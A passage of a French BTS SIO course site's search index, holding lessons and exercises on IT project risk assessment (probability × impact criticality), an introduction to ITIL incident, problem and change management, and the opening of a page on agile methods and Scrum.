d\u00e9veloppeurs (3 juniors, 2 seniors)</li> <li>Plateformes : iOS et Android</li> <li>Objectif : 10 000 utilisateurs en 6 mois</li> </ul> Risque Identifi\u00e9 Probabilit\u00e9 (1-5) Impact (1-5) Criticit\u00e9 Niveau Rejet de l'app par l'App Store 2 5 ? ? Probl\u00e8mes de compatibilit\u00e9 entre versions iOS/Android 4 3 ? ? Manque d'exp\u00e9rience de l'\u00e9quipe en d\u00e9veloppement mobile 3 4 ? ? Changement des guidelines des stores 3 3 ? ? Probl\u00e8mes de performance sur anciens appareils 4 4 ? ? Concurrence avec une app similaire lanc\u00e9e avant 3 4 ? ?              Criticit\u00e9 = Probabilit\u00e9 \u00d7 Impact          Contexte : Refonte site web universitaire (8 mois, 200k\u20ac, 25k utilisateurs)              \ud83c\udf10 Exercice 3 : \u00c9valuation de Risques Site Web Institutionnel              Vous \u00eates responsable de la refonte du site web d'une universit\u00e9. Analysez les risques suivants et calculez leur criticit\u00e9.          \ud83d\udccb Contexte du projet : <ul> <li>Dur\u00e9e : 8 mois</li> <li>Budget : 200 000 \u20ac</li> <li>\u00c9quipe : 6 d\u00e9veloppeurs + 2 designers</li> <li>Utilisateurs : 25 000 \u00e9tudiants et 2 000 enseignants</li> <li>Contrainte : Mise en ligne avant la rentr\u00e9e</li> </ul> Risque Identifi\u00e9 Probabilit\u00e9 (1-5) Impact (1-5) Criticit\u00e9 Niveau Retard dans la migration des donn\u00e9es existantes 3 4 ? ? Non-conformit\u00e9 aux normes d'accessibilit\u00e9 2 5 ? ? Surcharge du serveur lors de la rentr\u00e9e 4 5 ? ? R\u00e9sistance au changement des utilisateurs 4 2 ? ? Probl\u00e8mes d'int\u00e9gration avec le syst\u00e8me d'information 3 4 ? ? Attaque de s\u00e9curit\u00e9 pendant la migration 2 5 ? ?              Criticit\u00e9 = Probabilit\u00e9 \u00d7 Impact          Contexte : Application mobile de recensement de renards (Exercice guid\u00e9 d'identification de risques)              \ud83e\udd8a Exercice 4 : Identification Guid\u00e9e de Risques - App Renards Mission : Vous devez identifier et \u00e9valuer les risques pour le d\u00e9veloppement d'une application mobile de recensement des renards dans une r\u00e9serve naturelle.                  \ud83d\udccb Contexte du projet : <ul> <li>Client : R\u00e9serve naturelle des Vosges</li> <li>Objectif : Recenser et suivre la population de renards</li> <li>Utilisateurs : 15 gardes forestiers + 5 biologistes</li> <li>Fonctionnalit\u00e9s : G\u00e9olocalisation, photos, base de donn\u00e9es, rapports</li> <li>Dur\u00e9e : 5 mois</li> <li>Budget : 60 000 \u20ac</li> <li>Contraintes : Utilisation en for\u00eat (r\u00e9seau limit\u00e9)</li> </ul> \ud83c\udfaf Instructions guid\u00e9es : <p>Pour chaque cat\u00e9gorie ci-dessous, identifiez 2 \u00e0 3 risques sp\u00e9cifiques et \u00e9valuez leur probabilit\u00e9 et impact :</p> \ud83d\udd27 1. Risques Techniques <p>Indices : Pensez aux d\u00e9fis li\u00e9s \u00e0 :</p> <ul> <li>La g\u00e9olocalisation en for\u00eat</li> <li>La connectivit\u00e9 r\u00e9seau limit\u00e9e</li> <li>La synchronisation des donn\u00e9es</li> <li>La qualit\u00e9 des photos en ext\u00e9rieur</li> </ul> \ud83d\udc65 2. Risques Humains <p>Indices : Consid\u00e9rez :</p> <ul> <li>L'\u00e2ge et l'exp\u00e9rience technologique des utilisateurs</li> <li>La formation n\u00e9cessaire</li> <li>La r\u00e9sistance au changement</li> <li>La disponibilit\u00e9 des experts biologistes</li> </ul> \ud83c\udf0d 3. Risques Environnementaux <p>Indices : R\u00e9fl\u00e9chissez aux :</p> <ul> <li>Conditions m\u00e9t\u00e9orologiques</li> <li>Dur\u00e9e de vie de la batterie en ext\u00e9rieur</li> <li>R\u00e9sistance de l'\u00e9quipement</li> <li>Saisonnalit\u00e9 des observations</li> </ul> \ud83d\udcca 4. Risques Projet <p>Indices : Analysez :</p> <ul> <li>Les d\u00e9lais de d\u00e9veloppement</li> <li>Le budget limit\u00e9</li> <li>Les changements de sp\u00e9cifications</li> <li>La validation par les biologistes</li> </ul>                      Criticit\u00e9 = Probabilit\u00e9 \u00d7 Impact                  Contexte : Projet libre - Identification autonome de risques              \ud83d\ude80 Exercice 5 : Identification Libre de Risques - Votre Projet Mission : Choisissez un projet informatique de votre choix et identifiez de mani\u00e8re autonome les risques associ\u00e9s.                  \ud83d\udca1 Suggestions de projets : <ul> <li>Application de covoiturage pour votre \u00e9tablissement</li> <li>Plateforme de vente en ligne pour produits locaux</li> <li>Syst\u00e8me de r\u00e9servation pour une salle de sport</li> <li>Application de suivi de consommation \u00e9nerg\u00e9tique</li> <li>Site web de streaming pour cours en ligne</li> <li>Application mobile de gestion de budget \u00e9tudiant</li> <li>Ou tout autre projet qui vous int\u00e9resse !</li> </ul> \ud83d\udccb \u00c9tapes \u00e0 suivre : <ol> <li>D\u00e9finissez votre projet : Objectif, utilisateurs, fonctionnalit\u00e9s principales</li> <li>Fixez les contraintes : Dur\u00e9e, budget, \u00e9quipe, technologies</li> <li>Identifiez les risques : Minimum 8 risques vari\u00e9s</li> <li>\u00c9valuez chaque risque : Probabilit\u00e9 et impact</li> <li>Proposez des mesures : Pr\u00e9vention ou mitigation</li> <li>Priorisez : Classez par criticit\u00e9 d\u00e9croissante</li> </ol> \ud83c\udfaf D\u00e9finition de votre projet : Nom du projet : _________________________________ Objectif principal : _________________________________ Utilisateurs cibles : _________________________________ Dur\u00e9e estim\u00e9e : _________________________________ Budget approximatif : _________________________________ Taille de l'\u00e9quipe : _________________________________ Technologies envisag\u00e9es : _________________________________ N\u00b0 Risque Identifi\u00e9 Cat\u00e9gorie Probabilit\u00e9 (1-5) Impact (1-5) Criticit\u00e9 Mesure Pr\u00e9ventiveriticit\u00e9 = Probabilit\u00e9 \u00d7 Impact                  \ud83c\udfc6 Bonus - Analyse de criticit\u00e9 : <p>Classez vos risques par ordre de criticit\u00e9 d\u00e9croissante et justifiez les 3 risques les plus critiques :</p> <ol> <li>Risque le plus critique : ________________________</li> <li>Justification : ________________________</li> <li>2\u00e8me risque : ________________________</li> <li>Justification : ________________________</li> <li>3\u00e8me risque : ________________________</li> <li>Justification : ________________________</li> </ol> \ud83d\udea8 Risques Typiques en Projet Informatique \ud83d\udcbb Risques Techniques \u00c9lev\u00e9                  Probl\u00e8mes li\u00e9s aux technologies, architectures ou comp\u00e9tences techniques de l'\u00e9quipe.              <ul> <li>Choix technologique inadapt\u00e9</li> <li>Complexit\u00e9 sous-estim\u00e9e</li> <li>Manque de comp\u00e9tences</li> <li>Probl\u00e8mes d'int\u00e9gration</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Prototypage pr\u00e9coce                 \u2022 Formation de l'\u00e9quipe                 \u2022 Revues techniques r\u00e9guli\u00e8res                 \u2022 Architecture modulaire              \ud83d\udcc5 Risques Planning \u00c9lev\u00e9                  D\u00e9passements de d\u00e9lais dus \u00e0 une mauvaise estimation ou \u00e0 des impr\u00e9vus.              <ul> <li>Estimations optimistes</li> <li>D\u00e9pendances non identifi\u00e9es</li> <li>Scope creep</li> <li>Ressources indisponibles</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Estimation par analogie                 \u2022 Buffers de s\u00e9curit\u00e9                 \u2022 Jalons interm\u00e9diaires                 \u2022 Gestion du p\u00e9rim\u00e8tre              \ud83d\udc65 Risques Humains Moyen                  Probl\u00e8mes li\u00e9s \u00e0 l'\u00e9quipe, la communication ou la motivation.              <ul> <li>D\u00e9part d'un membre cl\u00e9</li> <li>Conflits dans l'\u00e9quipe</li> <li>Manque de motivation</li> <li>Communication d\u00e9faillante</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Documentation du savoir                 \u2022 Team building                 \u2022 Communication r\u00e9guli\u00e8re                 \u2022 Reconnaissance des efforts              \ud83d\udd12 Risques S\u00e9curit\u00e9 Critique                  Vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9 pouvant compromettre le syst\u00e8me ou les donn\u00e9es.              <ul> <li>Failles de s\u00e9curit\u00e9</li> <li>Perte de donn\u00e9es</li> <li>Acc\u00e8s non autoris\u00e9s</li> <li>Non-conformit\u00e9 RGPD</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Audit de s\u00e9curit\u00e9                 \u2022 Tests de p\u00e9n\u00e9tration                 \u2022 Chiffrement des donn\u00e9es                 \u2022 Formation s\u00e9curit\u00e9              \ud83d\udcb0 Risques Budg\u00e9taires Moyen                  D\u00e9passements de co\u00fbts ou contraintes budg\u00e9taires impactant le projet.              <ul> <li>Co\u00fbts sous-estim\u00e9s</li> <li>Licences logicielles</li> <li>Infrastructure cloud</li> <li>Ressources externes</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Estimation d\u00e9taill\u00e9e                 \u2022 Suivi des co\u00fbts                 \u2022 Solutions alternatives                 \u2022 N\u00e9gociation fournisseurs              \ud83c\udfe2 Risques Organisationnels Moyen                  Changements dans l'organisation ou les priorit\u00e9s affectant le projet.              <ul> <li>Changement de sponsor</li> <li>R\u00e9organisation</li> <li>Nouvelles priorit\u00e9s</li> <li>Changement de strat\u00e9gie</li> </ul> Strat\u00e9gies de mitigation :                 \u2022 Engagement des parties prenantes                 \u2022 Communication r\u00e9guli\u00e8re                 \u2022 Flexibilit\u00e9 du projet                 \u2022 Valeur business claire              \ud83d\udee1\ufe0f Strat\u00e9gies de Traitement des Risques \ud83d\udeab \u00c9vitement Pr\u00e9ventif                  \u00c9liminer compl\u00e8tement le risque en modifiant le plan de projet ou en changeant d'approche.              <ul> <li>Changer de technologie</li> <li>Modifier le p\u00e9rim\u00e8tre</li> <li>Choisir un autre fournisseur</li> <li>Simplifier l'architecture</li> </ul> Exemple pratique :                 \u00c9viter l'utilisation d'une technologie exp\u00e9rimentale en choisissant une solution \u00e9prouv\u00e9e.              \ud83d\udd04 Transfert D\u00e9l\u00e9gation                  Transf\u00e9rer la responsabilit\u00e9 du risque \u00e0 une tierce partie (assurance, sous-traitant, etc.).              <ul> <li>Sous-traitance sp\u00e9cialis\u00e9e</li> <li>Assurance projet</li> <li>Garanties fournisseur</li> <li>Contrats de service</li> </ul> Exemple pratique :                 Utiliser un service cloud manag\u00e9 pour transf\u00e9rer les risques d'infrastructure.              \ud83d\udee0\ufe0f Att\u00e9nuation R\u00e9duction                  R\u00e9duire la probabilit\u00e9 d'occurrence ou l'impact du risque par des actions pr\u00e9ventives.              <ul> <li>Formation de l'\u00e9quipe</li> <li>Tests suppl\u00e9mentaires</li> <li>Prototypage</li> <li>Revues de code</li> </ul> Exemple pratique :                 Mettre en place des tests automatis\u00e9s pour r\u00e9duire le risque de bugs en production.              \u2705 Acceptation Surveillance                  Accepter le risque en connaissance de cause et pr\u00e9voir des plans de contingence.              <ul> <li>Surveillance active</li> <li>Plans de contingence</li> <li>Budgets de r\u00e9serve</li> <li>Escalade d\u00e9finie</li> </ul> Exemple pratique :                 Accepter le risque de retard mineur et pr\u00e9voir un buffer dans le planning.              \ud83d\udd27 Outils et Techniques de Gestion des Risques \ud83c\udfaf Approche M\u00e9thodologique              La gestion des risques s'appuie sur une combinaison d'outils num\u00e9riques et de techniques d'analyse pour identifier, \u00e9valuer et traiter efficacement les risques.          \ud83d\udcbb Outils Num\u00e9riques Recommand\u00e9s \ud83d\udcca Microsoft Project / GanttProject Planification                  Outils de gestion de projet int\u00e9grant la gestion des risques avec matrices, registres et suivi automatis\u00e9.              \u2705 Fonctionnalit\u00e9s cl\u00e9s :                 \u2022 Registre des risques int\u00e9gr\u00e9                 \u2022 Matrices de probabilit\u00e9/impact                 \u2022 Alertes automatiques                 \u2022 Rapports de suivi                 \u2022 Int\u00e9gration planning projet              \ud83c\udfaf Trello / Notion / Monday Collaboration                  Plateformes collaboratives pour cr\u00e9er des tableaux de bord visuels de gestion des risques avec l'\u00e9quipe.              \u2705 Avantages :                 \u2022 Interface intuitive                 \u2022 Collaboration temps r\u00e9el                 \u2022 Templates personnalisables                 \u2022 Notifications automatiques                 \u2022 Accessibilit\u00e9 mobile              \ud83d\udcc8 Excel / Google Sheets Analyse                  Tableurs pour cr\u00e9er des matrices personnalis\u00e9es, calculer automatiquement les criticit\u00e9s et g\u00e9n\u00e9rer des graphiques.              \u2705 Templates disponibles :                 \u2022 Matrice probabilit\u00e9/impact                 \u2022 Registre des risques                 \u2022 Tableaux de bord KPI                 \u2022 Graphiques de tendances                 \u2022 Formules de calcul automatis\u00e9es              \ud83d\udd0d JIRA / Azure DevOps D\u00e9veloppement                  Outils sp\u00e9cialis\u00e9s pour les projets de d\u00e9veloppement avec gestion int\u00e9gr\u00e9e des risques techniques et fonctionnels.              \u2705 Sp\u00e9cificit\u00e9s IT :                 \u2022 Liens avec les bugs/incidents                 \u2022 Tra\u00e7abilit\u00e9 des exigences                 \u2022 M\u00e9triques de qualit\u00e9 code                 \u2022 Int\u00e9gration CI/CD                 \u2022 Rapports automatis\u00e9s              \ud83e\udde0 Techniques d'Analyse Essentielles \ud83d\udcad Brainstorming Structur\u00e9 Identification                  Session cr\u00e9ative organis\u00e9e pour identifier exhaustivement les risques avec toute l'\u00e9quipe projet.              \ud83c\udfaf M\u00e9thode recommand\u00e9e :                 1. Pr\u00e9paration : D\u00e9finir les cat\u00e9gories de risques                 2. Animation : Utiliser des techniques cr\u00e9atives                 3. Collecte : Noter tous les risques sans jugement                 4. Consolidation : Regrouper et prioriser                 5. Validation : Confirmer avec les experts              \u2696\ufe0f Analyse SWOT Projet Strat\u00e9gique                  Analyse des Forces, Faiblesses, Opportunit\u00e9s et Menaces sp\u00e9cifique au contexte du projet informatique.              \ud83d\udd0d Focus BTS SIO :                 \u2022 Forces : Comp\u00e9tences techniques \u00e9quipe                 \u2022 Faiblesses : Manque d'exp\u00e9rience, ressources                 \u2022 Opportunit\u00e9s : Technologies \u00e9mergentes                 \u2022 Menaces : \u00c9volution rapide du march\u00e9                 \u2022 Risques : D\u00e9riv\u00e9s des faiblesses/menaces              \ud83d\udd0e M\u00e9thode des 5 Pourquoi Analyse                  Technique d'analyse des causes racines pour comprendre l'origine profonde des risques identifi\u00e9s.              \ud83d\udcdd Exemple pratique : Risque : Retard de livraison Pourquoi 1 : Code non test\u00e9 Pourquoi 2 : Pas de plan de tests Pourquoi 3 : M\u00e9connaissance des bonnes pratiques Pourquoi 4 : Formation insuffisante Pourquoi 5 : Budget formation non pr\u00e9vu              \ud83c\udfb2 Analyse de Sc\u00e9narios Simulation                  Mod\u00e9lisation de diff\u00e9rents sc\u00e9narios (optimiste, r\u00e9aliste, pessimiste) pour \u00e9valuer l'impact des risques.              \ud83d\udcca Sc\u00e9narios types :                 \u2022 Optimiste : Aucun risque majeur                 \u2022 R\u00e9aliste : Risques moyens attendus                 \u2022 Pessimiste : Cumul de risques \u00e9lev\u00e9s                 \u2022 Catastrophe : Risques critiques simultan\u00e9s                 \u2022 Analyse : Probabilit\u00e9s et impacts"},{"location":"BTS/B1/ITIL/","title":"ITIL","text":"\ud83e\udded Introduction \u00e0 ITIL <p>Gestion des services informatiques et bonnes pratiques</p> \ud83d\udd04 De la gestion de projet \u00e0 la gestion de services \ud83d\udccb Contexte              Une fois qu'un projet informatique est termin\u00e9, le travail ne s'arr\u00eate pas. Il faut maintenir le service livr\u00e9, corriger les pannes, faire les mises \u00e0 jour et r\u00e9pondre aux utilisateurs.          \ud83e\udde0 Exemple concret <p>Apr\u00e8s le d\u00e9veloppement d'un site web, il faut ensuite surveiller le serveur, corriger les bugs, g\u00e9rer les utilisateurs et appliquer les mises \u00e0 jour de s\u00e9curit\u00e9.</p>          Cette phase s'appelle la gestion des services informatiques. C'est l\u00e0 qu'intervient ITIL : une collection de bonnes pratiques utilis\u00e9es dans le monde entier pour organiser et am\u00e9liorer les services IT.      \ud83d\udcda Qu'est-ce qu'ITIL ? \ud83d\udd39 D\u00e9finition ITIL (Information Technology Infrastructure Library) est un ensemble de bonnes pratiques (d\u00e9riv\u00e9s de la norme BS15000 ou ISO/CEI 20000 pour les syst\u00e8mes informatiques) pour la gestion des services informatiques.          \ud83d\udd04 Continuit\u00e9 des services                  Assurer que les services informatiques fonctionnent de mani\u00e8re continue et fiable.              \u26a1 R\u00e9action rapide                  R\u00e9agir rapidement en cas d'incident pour minimiser l'impact sur les utilisateurs.              \ud83d\udcc8 Am\u00e9lioration continue                  Am\u00e9liorer la qualit\u00e9 de service sur la dur\u00e9e gr\u00e2ce \u00e0 des processus optimis\u00e9s.                       \ud83d\udca1 ITIL ne dit pas comment faire techniquement, mais quoi mettre en place pour qu'un service fonctionne bien au quotidien.      \u2696\ufe0f Gestion de projet vs Gestion de service \ud83e\udd1d Compl\u00e9mentarit\u00e9              Ces deux approches ne s'opposent pas, elles se compl\u00e8tent.          \ud83d\ude80 Gestion de projet                  Sert \u00e0 concevoir et livrer un nouveau service (ex : cr\u00e9er une application, un site, un outil).              \ud83d\udd27 Gestion de service                  Sert \u00e0 faire vivre ce service sur la dur\u00e9e (maintenance, support, mises \u00e0 jour\u2026).              \ud83e\udde9 Exemple concret <p>Une \u00e9quipe d\u00e9veloppe une application mobile pendant 6 mois \u2192 c'est la gestion de projet.</p> <p>Une fois publi\u00e9e sur le Play Store, il faut corriger les bugs, r\u00e9pondre aux utilisateurs et d\u00e9ployer des mises \u00e0 jour \u2192 c'est la gestion de service.</p> Crit\u00e8re Gestion de projet Gestion de service (ITIL) \ud83c\udfaf Objectif Cr\u00e9er un nouveau produit ou service Faire fonctionner et am\u00e9liorer un service existant \u23f1\ufe0f Dur\u00e9e Limit\u00e9e (le projet a un d\u00e9but et une fin) Continue (le service reste actif en permanence) \ud83e\uddd1\u200d\ud83d\udcbb Acteurs principaux Chef de projet, d\u00e9veloppeurs, testeurs Techniciens, administrateurs, support utilisateur \ud83d\udee0\ufe0f Type d'activit\u00e9 Conception, d\u00e9veloppement, livraison Maintenance, support, mise \u00e0 jour, am\u00e9lioration \ud83d\uddd3\ufe0f P\u00e9riode d'action Avant la mise en service Apr\u00e8s la mise en service \ud83d\udca1 Exemple D\u00e9velopper un site e-commerce Corriger les pannes du site, le mettre \u00e0 jour \u2699\ufe0f M\u00e9thodes associ\u00e9es Gantt, PERT, Agile, Scrum ITIL, supervision, gestion d'incidents          \ud83e\udde0 \u00c0 retenir : La gestion de projet cr\u00e9e le service. ITIL fait vivre le service dans le temps.      \ud83c\udfd7\ufe0f Les quatre dimensions d'ITIL \ud83c\udfdb\ufe0f Les quatre piliers              ITIL consid\u00e8re qu'un bon service repose sur quatre piliers. Si l'un d'eux est n\u00e9glig\u00e9, le service devient instable.          \ud83e\uddd1\u200d\ud83d\udcbc Organisation &amp; personnes                  Les r\u00f4les, comp\u00e9tences et communication au sein de l'\u00e9quipe.  Ex : Support technique, helpdesk, chef de projet, responsables r\u00e9seau. \ud83d\udcbb Information &amp; technologie                  Les outils, logiciels et infrastructures utilis\u00e9s.  Ex : Serveurs, bases de donn\u00e9es, outils de ticketing (ex : GLPI). \ud83e\udd1d Partenaires &amp; fournisseurs                  Les prestataires et contrats externes.  Ex : H\u00e9bergeur, \u00e9diteur de logiciel, sous-traitants. \ud83d\udd04 Flux de valeur &amp; processus                  Les m\u00e9thodes et \u00e9tapes de travail pour d\u00e9livrer le service.  Ex : Proc\u00e9dure de gestion des incidents, sauvegardes planifi\u00e9es.          \ud83d\udcac Exemple : Si le serveur du lyc\u00e9e tombe (technologie), que personne ne sait le r\u00e9parer (organisation), et que le contrat d'h\u00e9bergement a expir\u00e9 (fournisseur), le service est \u00e0 l'arr\u00eat. Les quatre dimensions doivent donc \u00eatre \u00e9quilibr\u00e9es.      \u2699\ufe0f Les pratiques essentielles d'ITIL \ud83d\udd27 Trois pratiques cl\u00e9s              ITIL contient de nombreuses pratiques (ou \"processus\"), mais voici les trois plus importantes \u00e0 conna\u00eetre.          \u26a1 Gestion des incidents Objectif : r\u00e9tablir le service le plus vite possible. Exemple : L'application du client ne s'ouvre plus \u2192 on red\u00e9marre le serveur pour la remettre en ligne.                 L'objectif n'est pas de chercher la cause profonde, mais d'aider l'utilisateur rapidement.              \ud83e\udde0 Gestion des probl\u00e8mes Objectif : identifier la cause profonde des incidents r\u00e9currents. Exemple : Le serveur tombe souvent \u2192 on d\u00e9couvre un bug dans la base de donn\u00e9es. Une fois corrig\u00e9, les incidents disparaissent.              \ud83d\udd01 Gestion des changements Objectif : modifier un service sans cr\u00e9er de nouvelles pannes. Exemple : Installer une nouvelle version du module de paiement \u2192 on la teste avant la mise en production.                 Chaque changement doit \u00eatre planifi\u00e9, test\u00e9 et valid\u00e9 avant d\u00e9ploiement.              \ud83d\udccb Termes cl\u00e9s - Incidents Incident : Toute interruption ou d\u00e9gradation du service. Solution temporaire : Action rapide pour r\u00e9tablir le service.              \ud83d\udd0d Termes cl\u00e9s - Probl\u00e8mes Probl\u00e8me : Cause d'un ou plusieurs incidents. Solution d\u00e9finitive : Action qui \u00e9limine la cause du probl\u00e8me.              \ud83d\udd04 Termes cl\u00e9s - Changements Changement : Modification d'un service (mise \u00e0 jour, ajout, suppression). Validation : \u00c9tape de test et d'approbation avant d\u00e9ploiement.              \ud83d\udd0d Diff\u00e9rence entre incidents et probl\u00e8mes Aspect Gestion des incidents Gestion des probl\u00e8mes \ud83c\udfaf Objectif R\u00e9tablir le service au plus vite Trouver et \u00e9liminer la cause racine \u23f1\ufe0f Urgence \u00c9lev\u00e9e (l'utilisateur est bloqu\u00e9) Moindre (on agit apr\u00e8s coup) \ud83e\uddf0 Type d'action Correctif imm\u00e9diat (solution temporaire) Pr\u00e9ventif (solution d\u00e9finitive) \ud83d\udcac Exemple 1 Le Wi-Fi du lyc\u00e9e ne marche plus \u2192 on red\u00e9marre la borne On d\u00e9couvre un bug dans le firmware \u2192 mise \u00e0 jour \ud83d\udcac Exemple 2 Le site web est plant\u00e9 \u2192 red\u00e9marrage du serveur La base de donn\u00e9es est mal configur\u00e9e \u2192 optimisation SQL \ud83d\udcac Exemple 3 L'imprimante ne r\u00e9pond plus \u2192 on r\u00e9installe le pilote Le serveur d'impression est instable \u2192 mise \u00e0 jour du serveur          \ud83e\udde0 \u00c0 retenir : L'incident vise la rapidit\u00e9 : on r\u00e9pare vite. Le probl\u00e8me vise la durabilit\u00e9 : on emp\u00eache que \u00e7a revienne.      \ud83d\udcbc Exemple de mise en situation \ud83c\udfe2 Cas pratique d'entreprise <p>Une entreprise h\u00e9berge une application utilis\u00e9e par ses clients. Un matin, les utilisateurs signalent qu'ils ne peuvent plus se connecter.</p> 1 Incident                      Red\u00e9marrage du serveur pour r\u00e9tablir le service rapidement.                  2 Probl\u00e8me                      Analyse du bug dans la base de donn\u00e9es pour identifier la cause racine.                  3 Changement                      D\u00e9ploiement d'un correctif test\u00e9 et valid\u00e9 pour \u00e9viter la r\u00e9currence.                  \ud83d\udcdd Travaux Dirig\u00e9s Exercice 1 Exercice 2 Exercice 3 Exercice 4 Objectif : Distinguer les incidents des probl\u00e8mes dans le contexte ITIL              \ud83d\udca1 Activit\u00e9 d'application \u2013 Incidents et probl\u00e8mes <p>Avant de d\u00e9couvrir les processus ITIL, voyons si vous savez faire la diff\u00e9rence entre un incident (panne imm\u00e9diate) et un probl\u00e8me (cause d'incidents r\u00e9p\u00e9t\u00e9s).</p> 1.1 1.2 1.3 \u270f\ufe0f Exercice 1.1 \u2013 Incident ou probl\u00e8me ? <p>Indiquer pour chaque situation s'il s'agit d'un incident ou d'un probl\u00e8me.</p> Situation Type Justification L'imprimante du service comptabilit\u00e9 ne fonctionne plus _______ _______ Tous les lundis matin, le serveur web est lent _______ _______ Un utilisateur ne peut plus acc\u00e9der \u00e0 son dossier personnel _______ _______ Analyse de la cause des pannes r\u00e9currentes du r\u00e9seau _______ _______ \u270f\ufe0f Exercice 1.2 \u2013 Priorisation des incidents <p>Classer ces incidents par ordre de priorit\u00e9 (1 = le plus urgent, 4 = le moins urgent).</p> Incident Impact Urgence Priorit\u00e9 Serveur de messagerie en panne (toute l'entreprise) \u00c9lev\u00e9 \u00c9lev\u00e9e _______ Imprimante d'un bureau en panne Faible Faible _______ Site web client inaccessible \u00c9lev\u00e9 \u00c9lev\u00e9e _______ Logiciel de comptabilit\u00e9 lent (fin de mois) Moyen \u00c9lev\u00e9e _______ \u270f\ufe0f Exercice 1.3 \u2013 Escalade des incidents <p>Pour chaque incident, indiquer le niveau d'escalade appropri\u00e9.</p> Niveaux d'escalade :                         \u2022 Niveau 1 : Support utilisateur (helpdesk)                         \u2022 Niveau 2 : Techniciens sp\u00e9cialis\u00e9s                         \u2022 Niveau 3 : Experts/Ing\u00e9nieurs                         \u2022 Niveau 4 : Fournisseurs externes                      Incident Niveau d'escalade Justification Mot de passe oubli\u00e9 _______ _______ Serveur de base de donn\u00e9es corrompu _______ _______ Bug dans un logiciel m\u00e9tier _______ _______ Installation d'un nouveau logiciel _______ _______ Objectif : Ma\u00eetriser le processus de gestion des changements ITIL              \ud83d\udd27 Processus de gestion des changements <p>Vous devez mettre en place un processus de gestion des changements pour votre organisation.</p> 2.1 2.2 \u270f\ufe0f Exercice 2.1 \u2013 \u00c9tapes du changement <p>Remettre dans l'ordre les \u00e9tapes du processus de gestion des changements :</p> <ul> <li>\u2610 \u00c9valuation des risques</li> <li>\u2610 Demande de changement</li> <li>\u2610 Planification du changement</li> <li>\u2610 Approbation du changement</li> <li>\u2610 Impl\u00e9mentation</li> <li>\u2610 R\u00e9vision post-impl\u00e9mentation</li> <li>\u2610 Test et validation</li> </ul>                          \ud83d\udca1 Astuce : Pensez \u00e0 la logique : on ne peut pas impl\u00e9menter avant d'avoir approuv\u00e9, ni approuver avant d'avoir \u00e9valu\u00e9 les risques !                      \u270f\ufe0f Exercice 2.2 \u2013 Types de changements <p>Classifier chaque changement selon son type et son niveau d'approbation requis.</p> Types de changements :                         \u2022 Standard : Changement pr\u00e9-approuv\u00e9, faible risque                         \u2022 Normal : Changement n\u00e9cessitant une \u00e9valuation compl\u00e8te                         \u2022 Urgent : Changement d'urgence pour r\u00e9soudre un incident critique                      Changement Type Niveau d'approbation Justification Mise \u00e0 jour de s\u00e9curit\u00e9 Windows _______ _______ _______ Migration vers un nouveau serveur _______ _______ _______ Red\u00e9marrage d'urgence du serveur web _______ _______ _______ Ajout d'un nouvel utilisateur _______ _______ _______ Changement d'architecture r\u00e9seau _______ _______ _______ Objectif : Analyser un cas pratique et proposer des solutions ITIL              \ud83d\udcca Analyse de cas pratique <p>Analyser le cas suivant et proposer une solution ITIL appropri\u00e9e.</p> \ud83c\udfe2 Cas d'entreprise <p>Situation : Une entreprise de 200 employ\u00e9s constate que :</p> <ul> <li>Les pannes informatiques se r\u00e9p\u00e8tent chaque semaine</li> <li>Les utilisateurs appellent directement les techniciens</li> <li>Aucune documentation des incidents n'existe</li> <li>Les changements sont effectu\u00e9s sans validation</li> </ul> <p>Questions :</p> <ol> <li>Quels processus ITIL recommander ?</li> <li>Dans quel ordre les impl\u00e9menter ?</li> <li>Quels b\u00e9n\u00e9fices attendus ?</li> </ol> Objectif : Cr\u00e9er un plan d'impl\u00e9mentation ITIL complet sur le projet d'AP              \ud83c\udfaf Mise en pratique <p>Cr\u00e9er un plan d'impl\u00e9mentation ITIL pour votre organisation.</p> 1 Diagnostic                          \u00c9valuer la maturit\u00e9 actuelle de votre organisation en mati\u00e8re de gestion des services IT.                      2 Priorisation                          Identifier les processus ITIL les plus critiques \u00e0 impl\u00e9menter en premier.                      3 Planification                          \u00c9tablir un calendrier d'impl\u00e9mentation avec des jalons mesurables.                      4 Formation                          Planifier la formation des \u00e9quipes aux nouveaux processus ITIL."},{"location":"BTS/B1/Methodes_agiles/","title":"Methodes agiles","text":"\ud83d\ude80 M\u00e9thodes Agiles Avanc\u00e9es <p>BTS SIO SLAM - Bloc 1 : Gestion de projet informatique</p> \ud83c\udfaf L'Agilit\u00e9 dans les Projets Informatiques \ud83c\udf1f Manifeste Agile              Les m\u00e9thodes agiles privil\u00e9gient les individus et leurs interactions plut\u00f4t que les processus et les outils, des logiciels op\u00e9rationnels plut\u00f4t qu'une documentation exhaustive, la collaboration avec les clients plut\u00f4t que la n\u00e9gociation contractuelle, et l'adaptation au changement plut\u00f4t que le suivi d'un plan.                   Dans le d\u00e9veloppement de projets informatiques, l'agilit\u00e9 permet de g\u00e9rer efficacement l'incertitude, de livrer de la valeur rapidement et de s'adapter aux retours des utilisateurs et des parties prenantes.      \ud83d\udc65 Collaboration                  Communication constante entre l'\u00e9quipe, les utilisateurs et les parties prenantes du projet.              \ud83d\udd04 It\u00e9ration                  D\u00e9veloppement par cycles courts avec livraisons fr\u00e9quentes et am\u00e9lioration continue.              \ud83d\udcc8 Valeur                  Focus sur les fonctionnalit\u00e9s qui apportent le plus de valeur aux utilisateurs finaux.              \ud83c\udfaf Adaptation                  Capacit\u00e9 \u00e0 r\u00e9agir rapidement aux changements et aux retours d'exp\u00e9rience.              \ud83c\udfc3\u200d\u2642\ufe0f Scrum : Framework Agile \ud83c\udfc6 Scrum en Action              Scrum est un framework agile structur\u00e9 autour de sprints (it\u00e9rations de 1-4 semaines), d'\u00e9v\u00e9nements (r\u00e9unions rituelles) et d'artefacts (documents de travail). Parfait pour organiser des projets informatiques avec des livrables r\u00e9guliers.          \ud83d\udc51 Product Owner                  En entreprise, c'est souvent le responsable produit ou le repr\u00e9sentant client qui d\u00e9finit les besoins.              <ul> <li>D\u00e9finit les user stories</li> <li>Priorise le backlog produit</li> <li>Valide les fonctionnalit\u00e9s</li> <li>Interface avec les utilisateurs</li> </ul> \ud83c\udfaf Scrum Master                  Facilitateur du processus Scrum qui aide l'\u00e9quipe \u00e0 \u00e9liminer les obstacles et \u00e0 s'am\u00e9liorer.              <ul> <li>Anime les c\u00e9r\u00e9monies 